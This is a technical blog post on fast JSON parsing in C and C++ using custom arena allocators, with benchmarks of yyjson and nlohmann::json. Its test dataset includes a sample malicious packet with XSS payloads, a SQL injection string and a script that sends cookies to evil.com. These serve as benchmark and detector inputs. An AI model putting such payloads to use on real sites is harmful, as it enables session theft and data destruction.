---
title: "Parsing JSON in C & C++: Singleton Tax"
url: "https://ashvardanian.com/posts/parsing-json-with-allocators-cpp/"
fetched_at: 2026-05-05T07:01:50.358183+00:00
source: "Ash Vardanyan"
tags: [blog, raw]
---

# Parsing JSON in C & C++: Singleton Tax

Source: https://ashvardanian.com/posts/parsing-json-with-allocators-cpp/

I’d argue that almost every open-source developer gets an extra spark of joy when someone reads the documentation and uses their tool in a way that goes beyond the classic 101 examples.
It’s a rare treat even for popular projects like
JSON
parsers, but if you are building high-throughput software, such as
analyzing millions of network packets per second
, you’ll have to dig deeper.
The first thing I generally check in such libraries is the memory usage pattern and whether I can override the default memory allocator.
It is the most common singleton of them all!
From my vantage point, singletons are a significant code smell.
They might be convenient in small demos, but they come back to bite you in high-performance environments.
In this article, we’ll dig into how some of the most popular JSON parsing libraries handle memory management, why singletons make me cringe, how hard it is to implement hybrid structures in C++ what C++ developers can learn from C, and what difference custom allocators can make — especially when you’re parsing short JSON objects on a tight budget.
You can also jump directly to the source code by exploring the JSON
#pragma region
of
less_slow.cpp
repository on GitHub
.
The Cast & The Scene
#
There are several well-known libraries for JSON parsing in C/C++.
The most popular is
Niels Lohmann
’s
json
for “Modern C++”.
The most portable is likely
Yaoyuan Guo
’s
yyjson
, implemented in pure C.
The fastest for large inputs is
Daniel Lemire
’s
simdjson
, which uses SIMD.
Others also include (4.) Tencent’s
RapidJSON
and (5.) Stephen Berry’s
Glaze
, but we’ll focus on the first two for brevity.
As the inputs get longer, they are generally dominated by string parsing, where SIMD plays a crucial role and has been broadly covered in this blog.
Sadly,
simdjson
doesn’t currently support custom memory allocators
, which is a big reason for many to explore the alternatives.
You might think, “But my JSON files are tiny! Why care?” When the JSON is short—like the stuff jammed into network packets—your bottleneck shifts to the state machine logic and memory allocations.
And that’s where things get interesting.
Short JSONs are extremely common in configuration files and network packets, and we can optimize the usage pattern accordingly.
For example, when processing network packets, we know the underlying protocol’s Maximum Transmission Unit (
MTU
).
Link Layer:
Ethernet:
1500
bytes, or 9000 bytes with Jumbo Frames
802.11 Wi-Fi: 2304 bytes excluding headers, often reduced to 1500 bytes for compatibility with Ethernet
InfiniBand: configurable between 256, 512, 1024, 2048, and
4096
bytes
Network Layer:
IPv4: 576 to 1500 bytes with Path MTU Discovery
IPv6: 1280 to 1500 bytes with Path MTU Discovery
Transport Layer:
TCP: normally up to 1460 bytes of payload, subtracting 20 bytes for the IP header and 20 bytes for the TCP header from the most common 1500 bytes of Ethernet MTU
RDMA: normally 4096, when operating over InfiniBand
So I opted for a fixed-size, on-stack buffer of 4 KB—one page on most operating systems—perfect for
DOM
-like (Document Object Model) parsing.
We swallow the entire JSON object in one go, and then perform a recursive walk to hunt down anything suspicious, like malicious scripts for Cross-Site Scripting (
XSS
):
1
{
"comment"
:
"<script>alert('XSS')</script>"
}
Fixed Buffer Arena
#
To implement an arena allocator, we must define three functions:
allocate
,
deallocate
, and
reallocate
.
We may need additional bookkeeping to reuse the freed space if the deallocations can happen in any order.
Bookkeeping, however, isn’t free in time or space…
Our alternative is to keep 2 counters:
total_allocated
and
total_reclaimed
.
Both are monotonically increasing, but once
total_reclaimed
reaches
total_allocated
, we can reset both to zero and start populating the buffer from the beginning.
1
2
3
4
5
6
7
8
9
10
11
12
13
struct
fixed_buffer_arena_t
{
static
constexpr
std
::
size_t
capacity
=
4096
;
alignas
(
64
)
std
::
byte
buffer
[
capacity
];
/// The offset (in bytes) of the next free location
std
::
size_t
total_allocated
=
0
;
/// The total bytes "freed" so far
std
::
size_t
total_reclaimed
=
0
;
};
std
::
byte
*
allocate_from_arena
(
fixed_buffer_arena_t
&
arena
,
std
::
size_t
size
);
void
deallocate_from_arena
(
fixed_buffer_arena_t
&
arena
,
std
::
byte
*
ptr
,
std
::
size_t
size
);
std
::
byte
*
reallocate_from_arena
(
fixed_buffer_arena_t
&
arena
,
std
::
byte
*
ptr
,
std
::
size_t
old_size
,
std
::
size_t
new_size
);
We chose our arena to be 4096 bytes, a standard
RAM page size
on most modern Operating Systems.
We also align it to 64 bytes, the cache line size on many modern CPUs.
It’s true for most Intel and AMD CPUs but often wrong for Arm.
For example, the cache line size is 128 bytes on Apple M-series Arm chips.
On Intel and AMD, you can query the cache line size using the
cpuid
instruction
, but you’d need to parse the output differently.
On Linux-powered Arm systems, you can also read a specialized register, but on macOS, that is not allowed, and you’d need to use
sysctlbyname
.
Overall,
reading the cache line size in a portable fashion is a bit of a mess
, but it’s worth it for performance-critical code.
In C++,
most developers
wouldn’t think twice about raising a
std::bad_alloc
exception when out of memory.
At the same time, around 20% of C++ employers explicitly ban using exceptions,
according to annual JetBrains surveys
.
And they are right to do so, as exceptions can be extremely slow when thrown frequently!
Our functions will be better, and will be attributed with
noexcept
and
inline
, and will return
nullptr
on failure, as C projects do:
1
2
3
4
5
6
inline
std
::
byte
*
allocate_from_arena
(
fixed_buffer_arena_t
&
arena
,
std
::
size_t
size
)
noexcept
{
if
(
arena
.
total_allocated
+
size
>
fixed_buffer_arena_t
::
capacity
)
return
nullptr
;
// Not enough space
std
::
byte
*
ptr
=
arena
.
buffer
+
arena
.
total_allocated
;
arena
.
total_allocated
+=
size
;
return
ptr
;
}
Deallocation, as mentioned, is a no-op until the total reclaimed space equals the total allocated space.
Then we reset both counters to zero and start from the beginning:
1
2
3
4
inline
void
deallocate_from_arena
(
fixed_buffer_arena_t
&
arena
,
std
::
byte
*
ptr
,
std
::
size_t
size
)
noexcept
{
arena
.
total_reclaimed
+=
size
;
if
(
arena
.
total_allocated
==
arena
.
total_reclaimed
)
arena
.
total_allocated
=
0
,
arena
.
total_reclaimed
=
0
;
}
Reallocating is more complex, as we need to check if we can grow in place or if we need to allocate a new block, copy the data, and free the old block.
For readers’ familiarity, we will use
std::memmove
for the copy, but for higher performance, I’d use
sz_move
from StringZilla, which should yield another 10% boost on AVX-512 capable CPUs:
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
#include
<cstring>
// `std::memmove`
inline
std
::
byte
*
reallocate_from_arena
(
fixed_buffer_arena_t
&
arena
,
std
::
byte
*
ptr
,
std
::
size_t
old_size
,
std
::
size_t
new_size
)
noexcept
{
if
(
!
ptr
)
return
allocate_from_arena
(
arena
,
new_size
);
//  A fresh allocation
if
(
new_size
==
0
)
{
// This is effectively a `free` operation
deallocate_from_arena
(
arena
,
ptr
,
old_size
);
return
nullptr
;
}
std
::
byte
*
end_of_this_chunk
=
ptr
+
old_size
;
std
::
byte
*
arena_end
=
arena
.
buffer
+
arena
.
total_allocated
;
bool
is_last_chunk
=
end_of_this_chunk
==
arena_end
;
if
(
is_last_chunk
)
{
// Expand in-place if there's enough room
std
::
size_t
offset
=
static_cast
<
std
::
size_t
>
(
ptr
-
arena
.
buffer
);
std
::
size_t
required_space
=
offset
+
new_size
;
if
(
required_space
<=
fixed_buffer_arena_t
::
capacity
)
{
// We can grow (or shrink) in place
arena
.
total_allocated
=
required_space
;
return
ptr
;
}
}
// If we can't grow in place, do: allocate new + copy + free old
std
::
byte
*
new_ptr
=
allocate_from_arena
(
arena
,
new_size
);
if
(
!
new_ptr
)
return
nullptr
;
// Out of memory
// Copy the old data
std
::
memmove
(
new_ptr
,
ptr
,
std
::
min
(
old_size
,
new_size
));
deallocate_from_arena
(
arena
,
ptr
,
old_size
);
return
new_ptr
;
}
Piece of cake!
Parsing JSON in C
#
yyjson
is one of my favorite libraries—it’s delightfully simple to integrate and does exactly what it promises.
Distributed as a single header and a single source file, its only dependency is the C standard library.
Even better, it supports custom memory allocators and lets you selectively mask off big chunks of its codebase.
That can speed up compilation, which is always a bonus.
While
yyjson
may not reach the super-scalar heights of
simdjson
, it’s still impressively portable across platforms.
Getting
yyjson
into your project takes just a few lines in the
CMakeLists.txt
:
1
2
3
4
5
6
7
FetchContent_Declare
(
YaoyuanGuoYYJSON
GIT_REPOSITORY
https://github.com/ibireme/yyjson.git
GIT_TAG
0.10.0
)
FetchContent_MakeAvailable
(
YaoyuanGuoYYJSON
)
target_link_libraries
(
less_slow
PRIVATE
yyjson
)
Then, define a few macros in the source to disable features you don’t need—like writing JSON or UTF-8 validation—so you can slim down the library further:
1
2
3
4
#define YYJSON_DISABLE_WRITER 1
// We don't plan to dump JSON, only parse it
#define YYJSON_DISABLE_UTILS 1
// We don't need JSON-Patch, JSON-Pointer, or JSON-Query
#define YYJSON_DISABLE_UTF8_VALIDATION 1
// Helps increase throughput, but may not be fair to `nlohmann::json`
#include
<yyjson.h>
The most straightforward way to parse JSON with
yyjson
is:
1
2
3
std
::
string_view
packet_json
;
yyjson_doc
*
doc
=
yyjson_read
((
char
*
)
packet_json
.
data
(),
packet_json
.
size
());
yyjson_val
*
root
=
yyjson_doc_get_root
(
doc
);
This works fine for quick prototypes, but we’re here to discuss custom allocators.
For that, you’ll use
yyjson_read_opts
along with a dedicated
allocator structure
:
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
typedef
struct
yyjson_alc
{
/** Same as libc's malloc(size), should not be NULL. */
void
*
(
*
malloc
)(
void
*
ctx
,
size_t
size
);
/** Same as libc's realloc(ptr, size), should not be NULL. */
void
*
(
*
realloc
)(
void
*
ctx
,
void
*
ptr
,
size_t
old_size
,
size_t
size
);
/** Same as libc's free(ptr), should not be NULL. */
void
(
*
free
)(
void
*
ctx
,
void
*
ptr
);
/** A context for malloc/realloc/free, can be NULL. */
void
*
ctx
;
}
yyjson_alc
;
yyjson_doc
*
yyjson_read_opts
(
char
*
dat
,
size_t
len
,
yyjson_read_flag
flg
,
const
yyjson_alc
*
alc
,
yyjson_read_err
*
err
);
This API is nearly perfect, but there’s one caveat: the
free
function doesn’t receive the block size.
That means we must track allocations ourselves—a typical pattern with many custom allocators.
One approach is to prepend the size of each block to the block itself.
Since our arena is only 4 KB, a 16-bit integer is enough:
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
typedef
uint16_t
alc_size_t
;
void
*
allocate_from_arena_for_yyjson
(
void
*
ctx
,
size_t
size_native
)
{
alc_size_t
size
=
(
alc_size_t
)
size_native
;
char
*
result
=
(
char
*
)
allocate_from_arena
(
*
(
fixed_buffer_arena_t
*
)
ctx
,
size
+
sizeof
(
alc_size_t
));
if
(
!
result
)
return
NULL
;
memcpy
(
result
,
&
size
,
sizeof
(
alc_size_t
));
return
(
void
*
)(
result
+
sizeof
(
alc_size_t
));
}
void
*
deallocate_from_arena_for_yyjson
(
void
*
ctx
,
void
*
ptr
)
{
char
*
start
=
(
char
*
)
ptr
-
sizeof
(
alc_size_t
);
alc_size_t
size
;
memcpy
(
&
size
,
start
,
sizeof
(
alc_size_t
));
deallocate_from_arena
(
*
(
fixed_buffer_arena_t
*
)
ctx
,
start
,
size
+
sizeof
(
alc_size_t
));
return
NULL
;
}
If you prefer a ready-made solution,
yyjson_alc_pool_init
provides a first-party arena wrapper.
In practice, most of my code is in C++, so I skip sprinkling
_for_yyjson
everywhere by using lambdas and the unary
+
operator to cast them to C-style function pointers:
1
2
3
4
using
alc_size_t
=
std
::
uint16_t
;
alc
.
malloc
=
+
[](
void
*
ctx
,
size_t
size_native
)
noexcept
->
void
*
{
...
};
alc
.
realloc
=
+
[](
void
*
ctx
,
void
*
ptr
,
size_t
old_size_native
,
size_t
size_native
)
noexcept
->
void
*
{
...
};
alc
.
free
=
+
[](
void
*
ctx
,
void
*
ptr
)
noexcept
->
void
{
...
};
With allocations sorted out, how do we walk the parsed JSON?
In modern C99, the code might look like this:
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
#include
<stdbool.h>
// `_Bool`
#include
<stddef.h>
// `size_t`
#include
<string.h>
// `strstr`
_Bool
contains_xss_in_yyjson
(
yyjson_val
*
node
)
{
if
(
!
node
)
return
false
;
if
(
yyjson_is_obj
(
node
))
{
// Dictionary-like objects
size_t
idx
,
max
;
yyjson_val
*
key
,
*
val
;
yyjson_obj_foreach
(
node
,
idx
,
max
,
key
,
val
)
{
if
(
contains_xss_in_yyjson
(
val
))
return
true
;
}
return
false
;
}
if
(
yyjson_is_arr
(
node
))
{
// Arrays
yyjson_val
*
val
;
yyjson_arr_iter
iter
=
yyjson_arr_iter_with
(
node
);
while
((
val
=
yyjson_arr_iter_next
(
&
iter
)))
if
(
contains_xss_in_yyjson
(
val
))
return
true
;
return
false
;
}
if
(
yyjson_is_str
(
node
))
{
// Strings
return
strstr
(
yyjson_get_str
(
node
),
"<script>alert('XSS')</script>"
)
!=
NULL
;
}
return
false
;
}
So far, so good.
Let’s do the same in C++.
Parsing JSON in C++
#
The
nlohmann::json
library is designed to be simple and easy to use, but it’s not the most efficient or flexible.
The installation guide and the documentation website are some of the best as far as C++ libraries go.
1
2
3
4
5
6
7
FetchContent_Declare
(
NielsLohmannJSON
GIT_REPOSITORY
https://github.com/nlohmann/json.git
GIT_TAG
v3.11.3
)
FetchContent_MakeAvailable
(
NielsLohmannJSON
)
target_link_libraries
(
less_slow
PRIVATE
nlohmann_json::nlohmann_json
)
It’s a header-only library, so we don’t need to link anything.
Just include the header, and we are good to go:
1
#include
<nlohmann/json.hpp>
This brings the implementation of the
nlohmann::basic_json
template and
nlohmann::json
.
Much like
std::basic_string
and
std::string
, the latter is a typedef for the former.
The
nlohmann::basic_json
template looks like this:
1
2
3
4
5
6
7
8
9
10
11
12
13
template
<
template
<
typename
>
typename
object_t
=
std
::
map
,
template
<
typename
>
typename
array_t
=
std
::
vector
,
class
string_t
=
std
::
string
,
class
boolean_t
=
bool
,
class
number_integer_t
=
std
::
int64_t
,
class
number_unsigned_t
=
std
::
uint64_t
,
class
number_float_t
=
double
,
template
<
typename
>
typename
allocator_t
=
std
::
allocator
,
template
<
typename
>
typename
json_serializer
=
adl_serializer
,
class
binary_t
=
std
::
vector
<
std
::
uint8_t
>
,
class
object_comparator_t
=
std
::
less
<>>
class
basic_json
;
Somewhat more complex than
yyjson
, but it’s a C++ library, so it’s expected.
What’s tricky, is that 4x of the template arguments are templates themselves!
If you get them wrong, you’ll soon be greeted with 10,000 lines of error messages.
To simplify instantiating it with different allocators, I created a separate
json_containers_for_alloc
template and an alias
basic_json
using it:
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
#include
<nlohmann/json.hpp>
// Brings all the STL dependencies
template
<
template
<
typename
>
typename
allocator_
>
struct
json_containers_for_alloc
{
// Must allow `map<Key, Value, typename... Args>`, replaces `std::map`
template
<
typename
key_type_
,
typename
value_type_
,
typename
...
>
using
object
=
std
::
map
<
key_type_
,
value_type_
,
std
::
less
<>
,
allocator_
<
std
::
pair
<
const
key_type_
,
value_type_
>>>
;
// Must allow `vector<Value, typename... Args>`, replaces `std::vector`
template
<
typename
value_type_
,
typename
...
>
using
array
=
std
::
vector
<
value_type_
,
allocator_
<
value_type_
>>
;
using
string
=
std
::
basic_string
<
char
,
std
::
char_traits
<
char
>
,
allocator_
<
char
>>
;
};
template
<
template
<
typename
>
typename
allocator_
>
using
json_with_alloc
=
nlohmann
::
basic_json
<
//
json_containers_for_alloc
<
allocator_
>::
template
object
,
// JSON object
json_containers_for_alloc
<
allocator_
>::
template
array
,
// JSON array
typename
json_containers_for_alloc
<
allocator_
>::
string
,
// String type
bool
,
// Boolean type
std
::
int64_t
,
// Integer type
std
::
uint64_t
,
// Unsigned type
double
,
// Float type
allocator_
,
// Must allow `allocator<Value>`, replaces `std::allocator`
nlohmann
::
adl_serializer
,
// Must allow `serializer<Value>`
std
::
vector
<
std
::
uint8_t
,
allocator_
<
std
::
uint8_t
>>
,
// Binary string extension
void
// Custom base class
>
;
Not easy.
In the snippet above, we’ve mentioned our allocator 5x times in the
json_with_alloc
alias.
It goes downhill from here.
The
std::allocator
standard interface
defines a
propagate_on_container_move_assignment
, which is a boolean flag that tells the container if it should move the allocator when the container is moved.
Propagating the allocator on assignments makes sense, and combined with
rebind
, one would assume that the allocator is propagated down to the nested types.
It’s not the case.
Look at the following snippet from the
nlohmann::json
source code:
1
2
3
4
5
6
7
8
9
switch
(
t
)
{
case
value_t
::
object
:
{
AllocatorType
<
object_t
>
alloc
;
std
::
allocator_traits
<
decltype
(
alloc
)
>::
destroy
(
alloc
,
object
);
std
::
allocator_traits
<
decltype
(
alloc
)
>::
deallocate
(
alloc
,
&
object
);
break
;
}
case
value_t
::
array
:
{
...
On the third line,
AllocatorType<object_t> alloc;
is materialized from thin air.
There is no state propagation, and you are bound to use some singleton object to reference your arena.
Singletons are a
code smell
for a reason, and in this case, we will have to create a
static
or a
thread_local
instance of our arena and wrap it like the
std::allocator
:
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
thread_local
fixed_buffer_arena_t
local_arena
;
template
<
typename
value_type_
>
struct
fixed_buffer_allocator
{
using
value_type
=
value_type_
;
fixed_buffer_allocator
()
noexcept
=
default
;
template
<
typename
other_type_
>
fixed_buffer_allocator
(
fixed_buffer_allocator
<
other_type_
>
const
&
)
noexcept
{}
value_type
*
allocate
(
std
::
size_t
n
)
noexcept
(
false
)
{
if
(
auto
ptr
=
allocate_from_arena
(
local_arena
,
n
*
sizeof
(
value_type
));
ptr
)
return
reinterpret_cast
<
value_type
*>
(
ptr
);
else
throw
std
::
bad_alloc
();
}
void
deallocate
(
value_type
*
ptr
,
std
::
size_t
n
)
noexcept
{
deallocate_from_arena
(
local_arena
,
reinterpret_cast
<
std
::
byte
*>
(
ptr
),
n
*
sizeof
(
value_type
));
}
// Rebind mechanism and comparators are for compatibility with STL containers
template
<
typename
other_type_
>
struct
rebind
{
using
other
=
fixed_buffer_allocator
<
other_type_
>
;
};
bool
operator
==
(
fixed_buffer_allocator
const
&
)
const
noexcept
{
return
true
;
}
bool
operator
!=
(
fixed_buffer_allocator
const
&
)
const
noexcept
{
return
false
;
}
};
This is a lot of boilerplate, but it’s still better than using
std::pmr::monotonic_buffer_resource
or
std::pmr::unsynchronized_pool_resource
from the C++17 standard.
Those bring much noise and add extra latency with polymorphic
virtual
calls.
Our solution using
thread_local
isn’t perfect either.
The
thread_local
objects will grow your binary with additional entries in the
.tdata
and
.tbss
sections.
They will be allocated when a new thread is created and constructed on the first use.
The number of such variables is also limited.
On Windows
, the
TLS_MINIMUM_AVAILABLE
constant defines the minimum number of TLS slots available to a process.
On Linux,
PTHREAD_KEYS_MAX
can be used to query the maximum number of keys that can be created with
pthread_key_create
.
Curious about details?
Fangrui Song’s blog has more than I ever wanted to learn
about thread-local storage
.
Iterating through the structure in C++, however, may be cleaner than in C:
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
template
<
typename
json_type_
>
bool
contains_xss_nlohmann
(
json_type_
const
&
j
)
noexcept
{
if
(
j
.
is_object
())
{
for
(
auto
const
&
it
:
j
.
items
())
if
(
contains_xss_nlohmann
(
it
.
value
()))
return
true
;
return
false
;
}
else
if
(
j
.
is_array
())
{
for
(
auto
const
&
elem
:
j
)
if
(
contains_xss_nlohmann
(
elem
))
return
true
;
return
false
;
}
else
if
(
j
.
is_string
())
{
using
string_t
=
typename
json_type_
::
string_t
;
auto
const
&
s
=
j
.
template
get_ref
<
string_t
const
&>
();
return
s
.
find
(
"<script>alert('XSS')</script>"
)
!=
string_t
::
npos
;
}
else
{
return
false
;
}
}
All that’s left is to construct whatever
json_type_
instantiation will be and pass it to
contains_xss_nlohmann
.
I’d argue, that way most do it wrong:
1
2
3
4
5
try
{
using
json_t
=
json_with_alloc
<
fixed_buffer_allocator
>
;
json_t
j
=
json_t
::
parse
(
packet_json
);
}
catch
(
auto
const
&
e
)
{
}
The
try
-
catch
block is also a
code smell
and a performance killer.
A better convention is to use a different
::parse
overload, which
doesn’t throw exceptions
:
1
2
3
using
json_t
=
json_with_alloc
<
fixed_buffer_allocator
>
;
json_t
j
=
json_t
::
parse
(
packet_json
,
nullptr
,
false
);
j
.
is_discarded
();
// Check if the parsing was successful
Benchmarks will show why this matters.
Benchmarks
#
Dataset
#
Let’s test our JSON parsers with three carefully crafted packets.
First up, a perfectly valid one:
1
2
3
4
5
6
7
8
{
"meta"
:
{
"id"
:
42
,
"valid"
:
true
,
"coordinates"
:
[
0.0
,
0.0
],
"nesting"
:
[
[
[
null
]
]
]
},
"greetings"
:
[
{
"language"
:
"English"
,
"text"
:
"Hello there! How are you doing on this sunny day?"
},
{
"language"
:
"日本語"
,
"text"
:
"こんにちは！今日は晴れていますが、お元気ですか？"
},
{
"language"
:
"Español"
,
"text"
:
"Hola a todos, ¿cómo estáis hoy tan soleado?"
}
]
}
Next, a deliberately invalid one with a missing closing quote, an inline comment, and a trailing comma – take your pick of JSON sins 😁
1
2
3
4
5
6
7
8
9
{
"meta"
:
{
"id"
:
42
,
"valid"
:
true
,
"coordinates"
:
[
1.234
,
5.678
],
"nesting"
:
[
[
[
null
]
]
]
},
"greetings"
:
[
{
"language"
:
"English"
,
"text"
:
"Hello there! How are you doing on this sunny day?"
},
{
"language"
:
"日本語"
,
"text"
:
"こんにちは！今日は晴れていますが、お元気ですか？"
},
{
"language"
:
"Español"
,
"text"
:
"Hola a todos, ¿cómo estáis hoy tan soleado?"
}
],
"source"
:
"
127.0
.
0.1
,
// no inline comments allowed in vanilla JSON!
}
And finally, a malicious payload packed with
SQL injection
,
XSS
, and a cookie-stealing script – because why not go all out? 😁
1
2
3
4
5
6
7
8
9
{
"meta"
:
{
"id"
:
"<script>alert(document.cookie)</script>"
,
"valid"
:
true
,
"nesting"
:
[
[
[
null
]
]
]
},
"greetings"
:
[
{
"language"
:
"English"
,
"text"
:
"Hello there! <img src=x onerror='alert(1)'>"
},
{
"language"
:
"HTML"
,
"text"
:
"<iframe src='javascript:alert(`XSS`)'></iframe>"
},
{
"language"
:
"SQL"
,
"text"
:
"'; DROP TABLE users; --"
}
],
"comment"
:
"<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'https://evil.com/steal?cookie=' + document.cookie);</script>"
}
Platform
#
For reproducibility, I’m running these tests on AWS (the cloud provider you probably already use).
Specifically, a
c7i.48xlarge
instance powered by two
Intel Sapphire Rapids
4th-generation Xeon chips.
This machine packs 96 cores and 192 threads at 2.4 GHz.
I’ve disabled Simultaneous Multi-Threading (
SMT
) to keep timings consistent, leaving us 96 threads.
The system runs Ubuntu 24.04 LTS with GCC 14.
Results
#
We’re using the Google Benchmark toolchain for measurement.
For arena-based tests, we track peak memory usage.
We measure throughput in bytes per second and run everything single-threaded and on all physical cores.
Here’s what the
yyjson
benchmark looks like:
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
static
constexpr
std
::
string_view
packets_json
[
3
]
=
{
valid_json
,
invalid_json
,
malicious_json
};
template
<
...
>
static
void
json_yyjson
(
bm
::
State
&
state
)
{
// Some compile-time settings
fixed_buffer_arena_t
arena
;
yyjson_alc
alc
;
alc
.
ctx
=
&
arena
;
using
alc_size_t
=
std
::
uint16_t
;
alc
.
malloc
=
+
[](
void
*
ctx
,
size_t
size_native
)
noexcept
->
void
*
{
...
};
alc
.
realloc
=
+
[](
void
*
ctx
,
void
*
ptr
,
size_t
old_size_native
,
size_t
size_native
)
noexcept
->
void
*
{
...
};
alc
.
free
=
+
[](
void
*
ctx
,
void
*
ptr
)
noexcept
->
void
{
...
};
std
::
size_t
bytes_processed
=
0
,
peak_memory_usage
=
0
,
iteration
=
0
;
for
(
auto
_
:
state
)
{
// Google Benchmark will decide how many iterations to run
std
::
string_view
packet_json
=
packets_json
[
iteration
++
%
3
];
// Loop through the dataset
bytes_processed
+=
packet_json
.
size
();
yyjson_read_err
error
;
std
::
memset
(
&
error
,
0
,
sizeof
(
error
));
yyjson_doc
*
doc
=
yyjson_read_opts
((
char
*
)
packet_json
.
data
(),
packet_json
.
size
(),
YYJSON_READ_NOFLAG
,
&
alc
,
&
error
);
if
(
!
error
.
code
)
contains_xss_in_yyjson
(
yyjson_doc_get_root
(
doc
));
peak_memory_usage
=
std
::
max
(
peak_memory_usage
,
arena
.
total_allocated
);
yyjson_doc_free
(
doc
);
}
state
.
SetBytesProcessed
(
bytes_processed
);
state
.
counters
[
"peak_memory_usage"
]
=
bm
::
Counter
(
peak_memory_usage
,
bm
::
Counter
::
kAvgThreads
);
}
Now, the numbers are… interesting.
Let’s start with
yyjson
:
Benchmark
Single-threaded
Multi-threaded
json_yyjson<malloc>
370 ns
369 ns
json_yyjson<fixed_buffer>
325 ns
326 ns
With the fixed buffer arena and perfect textbook-style linear scaling, we’re seeing a neat
12%
speedup.
Most libraries would show a much bigger gap – so what gives?
The secret lies in
yyjson
’s clever design.
It has an internal memory management system that allocates arenas on demand and chains them together, forming a “linked list”.
Digging into
yyjson.c
, we find this telling line:
1
#define YYJSON_ALC_DYN_MIN_SIZE 0x1000
That’s 4 KB in decimal – exactly matching our fixed buffer size.
So even with
malloc
, we only allocate once per JSON packet.
nlohmann::json
takes a different approach.
It relies on separate
std::map
and
std::vector
instances for memory management.
The map is a tree structure, sprinkling allocated nodes randomly across your address space, while the vector isn’t much better.
No surprises here – this library will lag without arena allocation, whether you’re using exceptions or not:
Benchmark
Single-threaded
Multi-threaded
json_yyjson<malloc>
370 ns
369 ns
json_yyjson<fixed_buffer>
325 ns
326 ns
json_nlohmann<std::allocator, throw>
6,539 ns
json_nlohmann<fixed_buffer, throw>
6,027 ns
json_nlohmann<std::allocator, noexcept>
4,762 ns
json_nlohmann<fixed_buffer, noexcept>
4,307 ns
With the exception-throwing interface and malformed JSON in every other iteration, we’re running 20x slower than
yyjson
– and remember,
yyjson
isn’t even SIMD-accelerated!
The exception-free interface is still 15x slower, and just the memory allocation overhead ($4,762 - 4,307 = 455$ ns) exceeds
yyjson
’s entire parsing time.
Things get even spicier in multi-threaded scenarios.
Since
std::allocator
is a global singleton, access from 96 cores needs synchronization across multiple
NUMA
nodes and two physical sockets:
Benchmark
Single-threaded
Multi-threaded
json_yyjson<malloc>
370 ns
369 ns
json_yyjson<fixed_buffer>
325 ns
326 ns
json_nlohmann<std::allocator, throw>
6,539 ns
12,249 ns
json_nlohmann<fixed_buffer, throw>
6,027 ns
11,866 ns
json_nlohmann<std::allocator, noexcept>
4,762 ns
12,612 ns
json_nlohmann<fixed_buffer, noexcept>
4,307 ns
11,975 ns
But here’s the real kicker – our
fixed_buffer
version barely improves things.
Why?
Because synchronization overhead isn’t just in
malloc
and
free
.
It lurks in unexpected places, like the seemingly innocent locale-dependent
std::isspace
.
Singeltons are everywhere!
Conclusion
#
The
nlohmann::json
library is a fantastic starting point for beginners and smaller projects.
Its documentation shines, and its community support is top-notch.
You’ll find similar traits in many C++ and Rust projects.
Still, most of them rely on the global state outside of a few truly portable C libraries.
The irony?
The very qualities that make certain C libraries accessible to embedded systems also make them the only viable choice for the high-end!
Memory management for complex concurrent data structures is a fascinating rabbit hole.
Take
USearch
, one of
Unum’s libraries
, where my templates support two distinct allocator types for different allocation patterns:
One handles the append-only index
Another manages dynamic data structures
But even this isn’t enough.
In USearch v3, I’m planning a complete memory management overhaul to better handle scalability and NUMA awareness.
While data-parallel processing systems like
RedPanda
or
ScyllaDB
can get away with a thread-per-core and arena-per-thread pattern, that approach won’t work in non-uniform workloads, like the highly unbalanced nature of graph traversals.
It demands something different – though I’m still working out exactly what that “something” will be!
If you’re intrigued by memory management (and who isn’t?), I highly recommend exploring the implementations of
jemalloc
,
mimalloc
,
tcmalloc
, and
hoard
.
Many of these allocators build on
Emery Berger
’s
Heap Layers
project, which he covers in his regular CppCon talks:
For those curious about binary serialization formats, check out Google’s
Protocol Buffers
, Cloudflare’s
Cap’n’Proto
, and
MsgPack
.
They’re all worth exploring, at least for historical context.
Or, if you’re more hands-on, jump straight to
less_slow.cpp
on GitHub
to run these benchmarks on your hardware and discover other fun snippets with potentially surprising results!
